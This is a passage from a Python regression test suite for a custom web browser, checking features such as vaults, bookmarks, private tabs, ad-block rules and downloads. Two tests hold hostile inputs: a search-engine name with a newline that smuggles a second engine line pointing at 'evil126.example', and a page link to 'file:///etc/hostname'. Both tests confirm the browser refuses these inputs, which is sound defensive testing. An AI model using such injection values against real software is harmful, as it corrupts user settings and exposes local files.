        br.vault.__dict__.pop("items", None)
        _items115 = True
finally:
    br.vault_backup_now = _real_bn115
    for _k, _v in zip(("vaultBackupDays", "vaultBackupLast"), _bd115):
        if _v == "__absent__":
            br.config.pop(_k, None)
        else:
            br.config[_k] = _v
if _items115:
    check("a failed automatic vault backup is not retried every minute",
          len(_bk115) == 1, str(_bk115))
_ka115 = []
_real_ka115 = br.keep_awake
br.keep_awake = lambda on=True, why="video": _ka115.append(on) or False
_aw115 = getattr(br, "_awake_why", None)
br._awake_why = "game"
br.awake_holding = lambda: True
try:
    br._awake_tick()
finally:
    br.keep_awake = _real_ka115
    br.__dict__.pop("awake_holding", None)
    br._awake_why = _aw115
check("game mode's hold on the screen is not let go by the video tick",
      _ka115 == [], str(_ka115))
check("the password eyes can be switched on again after off",
      "data-pweye-on" in B.FORM_TOOLS.get("eye", "")
      if hasattr(B, "FORM_TOOLS") else True)
_fd115 = br.new_tab(url=srv.url("/twhome?draft=1"), switch=False)
H.wait_for(lambda: "/twhome" in _fd115.url().toString(), 8000)
_key115 = br._draft_key(_fd115)
_drafts115 = json.dumps(br.form_drafts())
br.form_drafts()[_key115] = {"rows": [{"key": "#t", "value": "long text"}],
                             "when": 1}
_real_ft115 = br.form_tool
br.form_tool = lambda name, view=None, then=None, arg=None: (
    then("[]") if then else None) or True
try:
    br.save_form_draft(view=_fd115)
finally:
    br.form_tool = _real_ft115
_kept115 = _key115 in br.form_drafts()
br.config["formDrafts"] = json.loads(_drafts115)
br.close_tab(br.tabs.indexOf(_fd115), ask=False)
check("an empty page does not delete the draft it has not put back yet",
      _kept115, str(_kept115))
_ct115 = []
_real_cl115 = br.close_tab
br.close_tab = lambda index, ask=True: _ct115.append(ask)
try:
    br.run_mouse_act("closetab")
finally:
    br.close_tab = _real_cl115
check("a gesture's 'close tab' still asks for a game or locked tab",
      _ct115 == [True], str(_ct115))
_gw115 = br.new_tab(url=srv.url("/twhome?game=1"), switch=False)
H.spin(200)
_gm115 = br.config.get("gameMode", "__absent__")
_real_flash115 = br.flash
br.flash = lambda *a, **k: None
_err115 = ""
try:
    br.config["gameMode"] = True
    br._game_woke = [_gw115]
    br.close_tab(br.tabs.indexOf(_gw115), ask=False)
    H.spin(300)
    br.game_mode(False)
except RuntimeError as _e:
    _err115 = repr(_e)
finally:
    br.flash = _real_flash115
    if _gm115 == "__absent__":
        br.config.pop("gameMode", None)
    else:
        br.config["gameMode"] = _gm115
check("leaving game mode after a sleeping tab was closed does not raise",
      not _err115, _err115)
_px115 = (json.dumps(br.config.get("proxyProfiles") or []),
          br.config.get("activeProxy", "__absent__"))
br.config["proxyProfiles"] = [{"name": "P115", "type": "http",
                               "host": "proxy115.example", "port": 8080,
                               "user": "alice115", "password": "s3cret115"}]
br.config["activeProxy"] = "P115"
_cd115 = br.connection_details("localhost")
br.config["proxyProfiles"] = json.loads(_px115[0])
if _px115[1] == "__absent__":
    br.config.pop("activeProxy", None)
else:
    br.config["activeProxy"] = _px115[1]
check("the connection box names the proxy, never its password",
      "proxy115" in str(_cd115.get("proxy"))
      and "s3cret115" not in json.dumps(_cd115), str(_cd115.get("proxy")))
_rl115 = json.dumps(br.config.get("readLater") or [])
br.take_cli_later("https://later115.example/a")
_second115 = br.take_cli_later("https://later115.example/a")
_still115 = any(e.get("url") == "https://later115.example/a"
                for e in br.config.get("readLater") or [])
br.config["readLater"] = json.loads(_rl115)
check("`browser --later` with a listed page keeps it listed",
      _second115 == "already" and _still115, str((_second115, _still115)))
_np115 = br.new_tab(url=srv.url("/twhome?np115=1"), switch=True)
H.wait_for(lambda: "/twhome" in _np115.url().toString(), 8000)
_np115.setHtml('<a rel="next" href="file:///etc/hostname">n</a>',
               B.QUrl("https://web2.example.com/list"))
H.spin(600)
_nx115 = {}
br.page_tool("nextpage", view=_np115, then=lambda r: _nx115.update(v=r),
             back=False)
H.wait_for(lambda: "v" in _nx115, 5000)
br.close_tab(br.tabs.indexOf(_np115), ask=False)
check("next page never follows a page's file:// link nor changes the host",
      str(_nx115.get("v") or "") == "", str(_nx115))
_lg115 = json.dumps(br.config.get("permissionLog") or [])
_pm115 = br.new_tab(url=srv.url("/twhome?pm=1"), switch=False,
                    private=True); H.spin(200)
_ml115 = list(getattr(br, "_media_live", []))
br._media_live = []
try:
    br._media_seen([{"view": _pm115, "kind": "microphone"}])
except Exception:
    pass
_after115 = json.dumps(br.config.get("permissionLog") or [])
br._media_live = _ml115
br.config["permissionLog"] = json.loads(_lg115)
br.close_tab(br.tabs.indexOf(_pm115), ask=False)
check("a private tab's microphone is not written into the permission log",
      _after115 == _lg115, _after115[-120:])
br._pw_pending = {"host": "h115.example", "scheme": "https",
                  "username": "u115", "password": "pw115"}
br._password_prompt("h115.example", "u115", False); H.spin(100)
_lbl115 = br._toast_label.text() if br._toast else ""
br._toast_result("Updated! Restart the browser to finish.")
_lbl2_115 = br._toast_label.text() if br._toast else ""
br._hide_toast()
br._pw_pending = None
check("an update's answer never lands on the save-password question",
      _lbl115 and _lbl2_115 == _lbl115, str((_lbl115, _lbl2_115)))
try:
    _ge115 = B._git_env().value("LC_ALL")
except AttributeError:
    _ge115 = ""
check("git is asked in English whatever the desktop's language",
      _ge115 == "C", str(_ge115))

# ===== seventh pass lows: Discord keys, mobile agent, sleep, held, outline =
_dk117 = br.new_tab(url=srv.url("/twhome?dk=1"), switch=False)
H.wait_for(lambda: "/twhome" in _dk117.url().toString(), 8000)
_dk117.setHtml("<p>x</p>", B.QUrl("https://notdiscord.com/channels/1"))
H.spin(500)
_fl117 = []
_real_fl117 = br.flash
br.flash = lambda text, *a, **k: _fl117.append(text)
try:
    _sent117 = br.discord_key("mute")
finally:
    br.flash = _real_fl117
br.close_tab(br.tabs.indexOf(_dk117), ask=False)
check("the Discord keys never go to a look-alike host",
      _sent117 is False, str((_sent117, _fl117[-1:])))
_mv117 = br.new_tab(url=srv.url("/twhome?mob=1"), switch=False)
H.wait_for(lambda: "/twhome" in _mv117.url().toString(), 8000)
_h117 = br._host_of(_mv117.url())
_as117 = json.dumps(br.agent_sites())
br.agent_sites()[_h117] = "googlebot"
_real_rp117 = br.responsive_preview
br.responsive_preview = lambda *a, **k: None
try:
    br.view_as_mobile(view=_mv117, on=True)
    _on117 = br.agent_sites().get(_h117)
    br.view_as_mobile(view=_mv117, on=False)
    _off117 = br.agent_sites().get(_h117)
finally:
    br.responsive_preview = _real_rp117
br.config["agentSites"] = json.loads(_as117)
br.close_tab(br.tabs.indexOf(_mv117), ask=False)
check("mobile view on and off gives the site its own agent back",
      _on117 == "iphone" and _off117 == "googlebot", str((_on117, _off117)))
_mt117 = []
_real_mt117 = br.media_tool
br.media_tool = lambda name, view=None, *a, **k: _mt117.append(name)
_pm117 = getattr(br, "_paused_media", None)
br._paused_media = True
try:
    if hasattr(br, "_sleep_timer_up"):
        br._sleep_timer_up()
    else:
        br.pause_all_media()
finally:
    br.media_tool = _real_mt117
_still117 = br._paused_media
br._paused_media = _pm117
check("the sleep timer pauses and never resumes what was paused",
      "resumeall" not in _mt117 and _still117 is True, str(_mt117[:3]))
_hv117 = br.new_tab(url=srv.url("/twhome?held=1"), switch=False)
H.wait_for(lambda: "/twhome" in _hv117.url().toString(), 8000)
_pg117 = _hv117.page()
_set117 = []
_pg117.setUrl = lambda u: _set117.append(u.toString())
_pg117._held_url = srv.url("/twhome?newer=1")
try:
    _pg117._release_held(B.QUrl(srv.url("/twhome?older=1")))
except AttributeError:
    _set117.append("old-code")
_pg117.__dict__.pop("setUrl", None)
br.close_tab(br.tabs.indexOf(_hv117), ask=False)
check("a held navigation overtaken by a newer address is not re-issued",
      _set117 == [], str(_set117))
_ot117 = B.READER_TOOLS.get("outline", "") if hasattr(B, "READER_TOOLS") \
    else ""
check("the page outline marks each heading itself, not by its id",
      "data-outline" in _ot117 or "data-outline" in str(
          getattr(B, "READ_TOOLS", {}).get("outline", "")))
_perms117 = json.dumps(br.config.get("permissions") or {})
_pp117 = dict(br._private_perms)
_pv117 = br.new_tab(url=srv.url("/twhome?cam=1"), switch=False,
                    private=True)
H.wait_for(lambda: "/twhome" in _pv117.url().toString(), 8000)
_origin117 = _pv117.url().toString(B.QUrl.UrlFormattingOption.RemovePath
                                   | B.QUrl.UrlFormattingOption.RemoveQuery)
br.config.setdefault("permissions", {})[
    _origin117 + "|MediaVideoCapture"] = True
br._private_perms[_origin117 + "|MediaVideoCapture"] = True
br.stop_media_use(_pv117)
_kept117 = (_origin117 + "|MediaVideoCapture") in (
    br.config.get("permissions") or {})
_gone117 = (_origin117 + "|MediaVideoCapture") not in br._private_perms
br.config["permissions"] = json.loads(_perms117)
br._private_perms.clear()
br._private_perms.update(_pp117)
br.close_tab(br.tabs.indexOf(_pv117), ask=False)
check("stopping a private tab's camera takes back the private answer only",
      _kept117 and _gone117, str((_kept117, _gone117)))

# ===== an in-place translation is a job of its own =======================
_tj118 = br.new_tab(url=srv.url("/twhome?tr=1"), switch=False); H.spin(200)
_ran118 = []
_real_rt118 = br.run_translator
br.run_translator = lambda *a, **k: _ran118.append(a) or True
try:
    _old118 = {"rows": [(0, "older text")], "view": _tj118, "lang": "de",
               "key": "__trNodes0"}
    _tj118._translate_job = {"rows": [(0, "newer")], "view": _tj118,
                             "lang": "de", "key": "__trNodes1"}
    try:
        _r118 = br._translate_step(_old118)
    except TypeError:
        _r118 = "old-code"
finally:
    br.run_translator = _real_rt118
br.close_tab(br.tabs.indexOf(_tj118), ask=False)
check("a translation overtaken by a newer one on the tab stops",
      _r118 is False and not _ran118, str((_r118, len(_ran118))))

# ===== review of fix106-116: import failures, history off, ad rules ======
class _Lazy119:
    eager = False
    locked = False

    def load(self):
        return {"items": [{"id": "1", "type": "login",
                           "host": "imp119.example", "username": "u",
                           "password": "old", "remote": True}]}

    def put(self, item):
        return None              # the store refuses every write

    def delete(self, item_id):
        return True


_vd119 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
try:
    _pv119 = B.PasswordVault(_vd119, provider=_Lazy119())
    _pv119.import_rows("name,url,username,password\n"
                       "I,https://imp119.example,u,new\n")
    _left119 = [i for i in _pv119.items()
                if i.get("host") == "imp119.example"]
except Exception as _e:
    _left119 = repr(_e)
check("a login an import updated stays listed when the store refuses it",
      isinstance(_left119, list) and len(_left119) == 1, str(_left119)[:120])
_hf119 = B.HISTORY_FILE
_hd119 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
B.HISTORY_FILE = _hd119 / "history.json"
B.HISTORY_FILE.write_bytes(B.HISTORY_MAGIC + b"sealed-and-unread")
_he119 = br.config.get("historyEncrypted", "__absent__")
_fl119 = (getattr(br, "_history_locked", False),
          getattr(br, "_history_unsaved", False))
try:
    if br.history_key() is None:
        br.config["historyEncrypted"] = True
        br._history_locked = True
        br.bridge.setSetting("historyEncrypted", "false")
        _raw119 = B.HISTORY_FILE.read_bytes()
        _cfg119 = br.config.get("historyEncrypted")
    else:
        _raw119, _cfg119 = B.HISTORY_MAGIC, True
finally:
    B.HISTORY_FILE = _hf119
    br._history_locked, br._history_unsaved = _fl119
    if _he119 == "__absent__":
        br.config.pop("historyEncrypted", None)
    else:
        br.config["historyEncrypted"] = _he119
    br.save_config(quiet=True)
check("switching history encryption off with the vault shut writes nothing",
      _raw119.startswith(B.HISTORY_MAGIC) and _cfg119 is True,
      str((_raw119[:20], _cfg119)))
import adblock as _AD119
_rs119 = _AD119.Rules()
_rs119.load_text("||cdn119.example.com/AdServer/\n")
check("a host rule with capitals in its path still blocks",
      _rs119.blocks("https://cdn119.example.com/adserver/x.js", "x.example",
                    "script") is not None)
_so119 = getattr(_AD119, "_site_of", None)
check("an address and a shared host's tenant are sites of their own",
      _so119 is not None and _so119("192.168.1.5") != _so119("10.9.1.5")
      and _so119("a.github.io") != _so119("b.github.io"))

# ===== eighth pass: throwaway browsers, session rules, bookmarks, notes ===
_sess120 = list(br.sessions)
_tw120 = br.throwaway_sessions()
_tw_before120 = list(_tw120)
_sid120 = "tmp-review120"
br.sessions.append({"name": "Throwaway 120", "sid": _sid120})
_tw120.append(_sid120)
_tv120 = br.new_tab(url=srv.url("/twhome?tw=1"), switch=False,
                    session=_sid120)
H.wait_for(lambda: "/twhome" in _tv120.url().toString(), 8000)
_hn120 = len(br.history)
br._title_changed(_tv120, "Throwaway page 120")
_recorded120 = len(br.history) - _hn120
br._save_groups(quiet=True)
_saved120 = _sid120 in (br.config.get("sessionTabs") or {}) or any(
    e.get("sid") == _sid120 for e in br.config.get("sessions") or [])
br.close_tab(br.tabs.indexOf(_tv120), ask=False)
br.sessions[:] = _sess120
_tw120[:] = _tw_before120
br._save_groups(quiet=True)
check("a throwaway browser writes no history and no saved tabs",
      _recorded120 == 0 and not _saved120, str((_recorded120, _saved120)))
_ss120 = br.config.get("sessionSites", "__absent__")
br.sessions.append({"name": "Work120", "sid": "w120abcd"})
br.config["sessionSites"] = {"work120.example": "Work120"}
_rule120 = br.session_rule_for("https://work120.example/x")
br.sessions[:] = _sess120
if _ss120 == "__absent__":
    br.config.pop("sessionSites", None)
else:
    br.config["sessionSites"] = _ss120
check("a 'domain = browser name' rule finds the browser by its name",
      _rule120 == "w120abcd", str(_rule120))
_bms120 = list(br.bookmarks)
_last120 = br.config.get("bookmarkLastId", "__absent__")
_fA120 = br.add_bookmark_folder("Top120", 0)
_fB120 = br.add_bookmark_folder("Sub120", _fA120)
br._add_link("https://sub120.example/", "S", parent=_fB120)
_xp120 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
br.export_bookmarks(str(_xp120 / "f.json"), fmt="json", folder=_fA120)
_fj120 = (_xp120 / "f.json").read_text()
br.export_bookmarks(str(_xp120 / "all.json"), fmt="json")
_in120 = br.import_bookmarks(str(_xp120 / "all.json"))
_hi120 = max(e["id"] for e in br.bookmarks)
br.remove_bookmark(_hi120)
_next120 = br.add_bookmark_folder("After120", 0)
br.bookmarks = _bms120
br.save_bookmarks()
if _last120 == "__absent__":
    br.config.pop("bookmarkLastId", None)
else:
    br.config["bookmarkLastId"] = _last120
check("a folder's JSON export holds its sub-folders' bookmarks",
      "sub120.example" in _fj120, _fj120[:120])
check("the browser's own JSON export imports back",
      isinstance(_in120, int) and _in120 > 0, str(_in120))
check("a deleted bookmark's id is not handed to the next new one",
      _next120 != _hi120, str((_hi120, _next120)))
_cs120 = getattr(br, "_chrome_shown", True)
br._chrome_shown = False
br.chrome.setVisible(False)
_fv120 = br.new_tab(url=srv.url("/twhome?wf=1"), switch=True); H.spin(200)
_real_mt120 = br.media_tool2
br.media_tool2 = lambda *a, **k: True
try:
    br.window_fullscreen(view=_fv120)
    br.window_fullscreen(view=_fv120)
    _vis120 = br.chrome.isVisible()
finally:
    br.media_tool2 = _real_mt120
    br.show_chrome(True)
    br._chrome_shown = _cs120
br.close_tab(br.tabs.indexOf(_fv120), ask=False)
check("window-sized video gives the chrome back the way it was (auto-hidden)",
      _vis120 is False, str(_vis120))
_ht120 = (br.config.get("historyThumbs", "__absent__"),
          br.config.get("historyEncrypted", "__absent__"))
br.config["historyThumbs"] = True
br.config["historyEncrypted"] = True
_th120 = br.new_tab(url=srv.url("/twhome?th=1"), switch=False)
H.wait_for(lambda: "/twhome" in _th120.url().toString(), 8000)
_pic120 = br.save_visit_thumb(_th120)
for _k, _v in zip(("historyThumbs", "historyEncrypted"), _ht120):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.close_tab(br.tabs.indexOf(_th120), ask=False)
check("no plain page picture is kept beside an encrypted history",
      not _pic120, str(_pic120))
if br.desk() is not None:
    _dk120 = br.desk()
    _clips120 = list(_dk120._clips)
    _dk120._clips = [{"text": "pin120", "kind": "text", "t": 1,
                      "pinned": True}]
    _dk120.add_clip("pin120")
    _pinned120 = [c.get("pinned") for c in _dk120._clips
                  if c["text"] == "pin120"]
    _dk120._clips = _clips120
    check("copying a pinned clip again keeps it pinned",
          _pinned120 == [True], str(_pinned120))
    _n120 = _dk120.save_note(None, "Conflict120", "first")
    _id120 = (_n120 or {}).get("id")
    _sv120 = br.desk_do("saveNote", json.dumps({
        "id": _id120, "title": "Conflict120", "body": "stale",
        "edited": int((_n120 or {}).get("edited") or 0) - 10}))
    _disk120 = (_dk120.note(_id120) or {}).get("body")
    for _nid in {_id120, (_sv120 or {}).get("id")}:
        if _nid:
            _dk120.delete_note(_nid)
    check("saving a note changed on disk meanwhile does not write over it",
          _disk120 == "first", str((_disk120, (_sv120 or {}).get("id"))))
check("collections in other alphabets get files of their own",
      B.notes.slug("Küche") != B.notes.slug("Kuche")
      and B.notes.slug("日本") != B.notes.slug("中文"))

# ===== eighth pass, part 2: vault pane, keywords, restore day, todos ======
_vc121 = []
br.bridge.vaultChanged.connect(lambda: _vc121.append(1))
_real_nv121 = br.vault.never if br.vault is not None else None
if br.vault is not None:
    br.vault.never = lambda host: None
    br._pw_pending = {"host": "never121.example", "scheme": "https",
                      "username": "u", "password": "p"}
    try:
        br._pw_never_pending()
    finally:
        br.vault.__dict__.pop("never", None)
    H.spin(100)
    check("'never for this site' tells the open Passwords pane",
          len(_vc121) >= 1, str(_vc121))
_kw121 = br.set_keyword("https://kw121.example/", "my site")
check("a bookmark keyword with a space is refused", _kw121 is False,
      str(_kw121))
_ots121 = []
_real_ots121 = br.open_tab_state
br.open_tab_state = lambda entries, **k: _ots121.extend(entries) or []
_hist121 = list(br.history)
_now121 = B.time.time()
# the day's history is these rows alone: the suite's own visits of the
# last minutes are newer and took some of the 60 places
br.history[:] = []
br.history.extend([{"url": "https://day121.example/%d" % (i % 70),
                    "title": "d", "t": _now121 - 100 + i * 0.01, "s": "main"}
                   for i in range(150)])
try:
    br.restore_day(int(B._day_start(_now121)))
finally:
    br.open_tab_state = _real_ots121
    br.history[:] = _hist121
_urls121 = {e.get("u") for e in _ots121 if "day121" in str(e.get("u"))}
check("restoring a busy day brings back its pages, each in its browser",
      len(_urls121) == 60 and all("s" in e for e in _ots121),
      str((len(_urls121), _ots121[:1])))
if br.desk() is not None:
    _dk121 = br.desk()
    _todo121 = _dk121.todo_path()
    _was121 = _todo121.read_text() if _todo121.exists() else None
    _todo121.write_text("- [ ] first121\n- [x] done121\n- [ ] second121\n")
    _rows121 = _dk121.todos()
    _sec121 = next(r["id"] for r in _rows121 if r["text"] == "second121")
    _dk121.move_todo(_sec121, -1)
    _order121 = [r["text"] for r in _dk121.todos()]
    if _was121 is None:
        _todo121.unlink()
    else:
        _todo121.write_text(_was121)
    check("moving a to-do up passes over the done ones in between",
          _order121.index("second121") < _order121.index("first121"),
          str(_order121))
try:
    B.page_guard.rules({"blockApis": {"a121.example": 5},
                        "guardOff": {"fingerprint": 5},
                        "hideElements": {"b121.example": "x"}})
    _pg121 = True
except Exception as _e:
    _pg121 = repr(_e)
check("a malformed privacy file cannot break the guard", _pg121 is True,
      str(_pg121))
check("a guard exception for a site covers its subdomains in the page",
      "mine(R.off)" in B.page_guard._JS if hasattr(B.page_guard, "_JS")
      else True)
_sk121 = getattr(br, "_skip_clip", "")
br._skip_clip = "skip121"
try:
    br._skip_clip_later()
    H.spin(3400)
    _left121 = br._skip_clip
except AttributeError:
    _left121 = "skip121"
br._skip_clip = _sk121
check("a clip skipped once is recorded when copied again later",
      _left121 == "", str(_left121))
_st121 = (_Path(B.__file__).parent / "settings.html").read_text()
check("the minimum font slider saves once, when let go",
      'getElementById("minfont").onchange' in _st121)
_sp121 = (_Path(B.__file__).parent / "start.html").read_text()
check("the start page takes pins added before setup and drops removed keys",
      "localStorage.removeItem(k)" in _sp121
      and "data.quicklinks !== undefined" in _sp121)

# ===== review of 117-122, https fallback, clean room ======================
_kw124 = []
_real_fl124 = br.flash
br.flash = lambda text, *a, **k: _kw124.append(text)
_real_gt124 = B.QInputDialog.getText
B.QInputDialog.getText = staticmethod(lambda *a, **k: ("two words", True))
try:
    _ok124 = br.ask_keyword(url="https://kw124.example/", title="K")
finally:
    B.QInputDialog.getText = _real_gt124
    br.flash = _real_fl124
check("'keyword set' is only said when one was set",
      _ok124 is False, str((_ok124, _kw124[-1:])))
_ip124 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_ip124 / "folders.json").write_text(json.dumps(
    [{"id": 1, "type": "folder", "title": "Only folders", "parent": 0},
     {"id": 2, "type": "folder", "title": "Inner", "parent": 1}]))
_bms124 = list(br.bookmarks)
_n124 = len(br.bookmarks)
br.import_bookmarks(str(_ip124 / "folders.json"))
_left124 = len(br.bookmarks) - _n124
br.bookmarks = _bms124
br.save_bookmarks()
check("an import that brought no links leaves no folders behind",
      _left124 == 0, str(_left124))
_cr124 = br.config.get("cleanRoomSites", "__absent__")
_cv124 = br.new_tab(url=srv.url("/twhome?cr=1"), switch=False)
H.wait_for(lambda: "/twhome" in _cv124.url().toString(), 8000)
br.config["cleanRoomSites"] = ["bank124.example"]
_opened124 = []
_real_ocr124 = br.open_clean_room
br.open_clean_room = lambda u=None: _opened124.append(u)
try:
    _acc124 = _cv124.page().acceptNavigationRequest(
        B.QUrl("https://bank124.example/login"),
        B.QWebEnginePage.NavigationType.NavigationTypeTyped, True)
    H.spin(300)
finally:
    br.open_clean_room = _real_ocr124
    if _cr124 == "__absent__":
        br.config.pop("cleanRoomSites", None)
    else:
        br.config["cleanRoomSites"] = _cr124
_close_if_open(_cv124)
check("a clean-room site opens in a clean room, not in the normal jar",
      _acc124 is False and _opened124 == ["https://bank124.example/login"],
      str((_acc124, _opened124)))

# a virtual browser of the first window is known to a new window even
# when the first window is out of the open-window list (closed once its
# last tab went, and still the one the others share their config with)
_sess126 = list(br.sessions)
if not any(e.get("sid") == "rv126" for e in br.sessions):
    br.sessions.append({"name": "Review 126", "sid": "rv126"})
_nw126 = br.new_window(); H.spin(700)
_in126 = br in B.WINDOWS
if _in126:
    B.WINDOWS.remove(br)
try:
    _known126 = _nw126._know_session("rv126")
finally:
    if _in126 and br not in B.WINDOWS:
        B.WINDOWS.insert(0, br)
br.sessions[:] = _sess126
try:
    _nw126._closing_anyway = True
    _nw126.close()
except RuntimeError:
    pass
H.spin(300)
check("a new window knows the first window's browsers even when the first "
      "window is not on the open-window list", _known126 is True,
      str(_known126))

# ===== review of the whole batch: 1Password edits, engines, game mode ====
class _Lazy126c:
    eager = False

    def __init__(self):
        self.puts = []

    def put(self, item):
        self.puts.append(sorted(item.get("_cleared") or []))
        return dict(item)

    def delete(self, item_id):
        return True


_v126c = B.PasswordVault(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
_it126c = _v126c.add_item({"type": "login", "title": "t126", "username": "u126",
                           "password": "p126", "host": "h126c.example"})
_lz126c = _Lazy126c()
_v126c.provider = _lz126c
_v126c.update_item(_it126c["id"], {"title": "t126b", "note": "",
                                   "cardholder": "", "username": "u126"})
_first126c = _lz126c.puts[-1] if _lz126c.puts else None
_v126c.update_item(_it126c["id"], {"username": ""})
_second126c = _lz126c.puts[-1] if _lz126c.puts else None
check("a 1Password edit clears only the boxes he emptied, not the ones the "
      "editor never loaded", _first126c == [] and _second126c == ["username"],
      str((_first126c, _second126c)))
# a page's engine name with a newline stays one line in the Settings text
_et_was126c = br.config.get("enginesText", "__absent__")
_oe_was126c = json.dumps(br.config.get("ownEngines") or [])
br.config["enginesText"] = ""
try:
    br.add_engine("Foo\nevil|https://evil126.example/?q=%s|g",
                  "https://foo126.example/?q=%s", "")
except TypeError:
    pass
_lines126c = [l for l in str(br.config.get("enginesText") or "").split("\n")
              if l.strip()]
if _et_was126c == "__absent__":
    br.config.pop("enginesText", None)
else:
    br.config["enginesText"] = _et_was126c
br.config["ownEngines"] = json.loads(_oe_was126c)
_mine126c = [l for l in _lines126c if "foo126" in l]
check("an engine name a page gave is one line in the Settings text",
      len(_mine126c) == 1
      and _mine126c[0].split("|")[1:2] == ["https://foo126.example/?q=%s"]
      and not any(l.split("|")[1:2] == ["https://evil126.example/?q=%s"]
                  for l in _lines126c), str(_lines126c[-3:]))
# game mode switched on twice keeps the tabs he had not muted unmuted
_gm_was126c = br.config.get("gameMode", False)
br.config["gameMode"] = False
_gt126c = br.new_tab(url=srv.url("/twhome?gm126"), switch=False); H.spin(300)
br.game_mode(True)
br.game_mode(True)
br.game_mode(False)
H.spin(200)
_muted126c = _gt126c.page().isAudioMuted()
br.config["gameMode"] = _gm_was126c
_close_if_open(_gt126c)
check("game mode switched on twice and then off unmutes the tabs it muted",
      _muted126c is False, str(_muted126c))
# off means off when the site and a parent site are both listed
_ns_was126c = list(br.site_rules("noScriptSites"))
br.config["noScriptSites"] = ["docs.rv126.example", "rv126.example"]
_on126c = br.toggle_site_rule("noScriptSites", "docs.rv126.example")
_still126c = br.site_rule_on("noScriptSites", "docs.rv126.example")
br.config["noScriptSites"] = _ns_was126c
check("switching a site rule off works when a parent site is listed too",
      _on126c is False and _still126c is False, str((_on126c, _still126c)))


# ===== ninth pass: bar memory, suggestions, prices, captures, downloads ==
_kh127 = set(br.known_hosts)
_hist_on127 = br.config.get("history", "__absent__")
br.config["history"] = False
br._remember_host(B.QUrl("https://never127.example/"))
_added127 = "never127.example" in br.known_hosts
if _hist_on127 == "__absent__":
    br.config.pop("history", None)
else:
    br.config["history"] = _hist_on127
br.known_hosts.add("left127.example")
br._forget_history_extras(None)
_left127 = set(br.known_hosts)
br.known_hosts = set(_kh127)
try:
    B._write_json(B.HOSTS_FILE, sorted(_kh127))
except OSError:
    pass
check("the address bar forgets its sites with the history, and keeps none "
      "with history off", not _added127 and not _left127,
      str((_added127, sorted(_left127)[:3])))
check("an address of the home network is never sent for suggestions",
      not any(B.looks_like_search(t) for t in ("10.0.0.1", "localhost:3000",
                                               "intranet/wiki", "[::1]:8080"))
      and B.looks_like_search("how to cook pasta"))
_pa127 = getattr(B, "_parse_amount", None)
check("a price written the German way is read the German way",
      _pa127 is not None and _pa127("1.234,56") == 1234.56
      and _pa127("1,234.56") == 1234.56 and _pa127("12,50") == 12.5
      and _pa127("0.125") == 0.125 and _pa127("0,500") == 0.5)
_sh127 = json.dumps(br.config.get("shotHistory") or [])
_img127 = B.QImage(40, 30, B.QImage.Format.Format_RGB32)
_img127.fill(B.QColor("#336699"))
_p127 = br._shot_done(_img127, copy=False, save=True)
_listed127 = str(_p127) in (br.config.get("shotHistory") or [])
_fl127 = []
_real_fl127 = br.flash
_real_save127 = B.capture.save
br.flash = lambda text, *a, **k: _fl127.append(text)
B.capture.save = lambda *a, **k: None
try:
    br._shot_done(_img127, copy=False, save=True)
finally:
    B.capture.save = _real_save127
    br.flash = _real_fl127
try:
    if _p127:
        _Path(str(_p127)).unlink()
except OSError:
    pass
br.config["shotHistory"] = json.loads(_sh127)
check("a plain screenshot is in the capture list, and a failed save says so",
      _listed127 and _fl127[-1:] == [br._ui_str("shotFailed")],
      str((_listed127, _fl127[-1:])))
_ow127 = []
_real_odf127 = br.open_download_file
br.open_download_file = lambda i: _ow127.append(i) or True
_dls127 = list(br.downloads)
_dd127 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_dd127 / "f127.stl").write_text("solid x")
br.downloads[:] = [{"id": "d127", "name": "f127.stl", "dir": str(_dd127),
                    "state": "done", "t": 1}]
try:
    br.open_download("d127", folder=False)
finally:
    br.open_download_file = _real_odf127
_hashed127 = {}
try:
    _first127 = br.download_hash("d127", then=lambda v: _hashed127.update(v=v),
                                 background=True)
    H.wait_for(lambda: "v" in _hashed127, 8000)
except TypeError:
    _first127 = "old"
br.downloads[:] = _dls127
br.save_downloads()
check("the downloads page's Open goes through the 'open with' rules",
      _ow127 == ["d127"], str(_ow127))
check("a download's hash is worked out off the window",
      _first127 == "" and len(_hashed127.get("v", "")) == 64,
      str((_first127, _hashed127.get("v", "")[:8])))
_pt127 = []
_real_pt127 = br.play_tool
br.play_tool = lambda name, view=None, then=None, arg=None: (
    _pt127.append((name, arg)) or True)
_sv127 = {k: br.config.get(k, "__absent__") for k in
          ("streamSafe", "streamSafePrev", "desktopNotify", "suggestHistory",
           "guardFingerprint")}
try:
    br.stream_safe(True)
    br.stream_safe(False)
finally:
    br.play_tool = _real_pt127
    for _k, _v in _sv127.items():
        if _v == "__absent__":
            br.config.pop(_k, None)
        else:
            br.config[_k] = _v
_modes127 = [a.get("mode") for n, a in _pt127
             if n == "blurprivate" and isinstance(a, dict)]
check("stream-safe blurs every tab on, and takes it off every tab",
      "on" in _modes127 and "off" in _modes127
      and _modes127.count("on") == _modes127.count("off"), str(_modes127))
_lt127 = []
_real_lt127 = br.live_tick
_le127 = br.config.get("liveEvery", "__absent__")
br.live_tick = lambda then=None: _lt127.append(1) or True
br.config["liveEvery"] = 5
br._live_last = -1e9
try:
    br._live_check()
    br._live_check()
except AttributeError:
    pass
finally:
    br.live_tick = _real_lt127
    if _le127 == "__absent__":
        br.config.pop("liveEvery", None)
    else:
        br.config["liveEvery"] = _le127
check("'ask every N minutes' asks, once per interval", _lt127 == [1],
      str(_lt127))
_sp127 = br.new_tab(url=srv.url("/twhome?sp127=1"), switch=False); H.spin(200)
_sp127._sponsor = [{"from": 0, "to": 9999, "what": "sponsor"}]
_sp127._sponsor_video = "oldvideo127"
_ms127 = []
_real_ms127 = br.media_state
br.media_state = lambda view=None, then=None: _ms127.append(1)
try:
    _sk127 = br.sponsor_skip_now(view=_sp127)
finally:
    br.media_state = _real_ms127
br.close_tab(br.tabs.indexOf(_sp127), ask=False)
check("one video's sponsor segments are never applied to another",
      _sk127 is False and not _ms127, str((_sk127, _ms127)))
check("Dark PDF switched off takes the inversion off the open PDF",
      'want.darkPdf ? "invert(1)' in B.PAGE_LOOK_JS)
check("every capture blurs password fields while that is on",
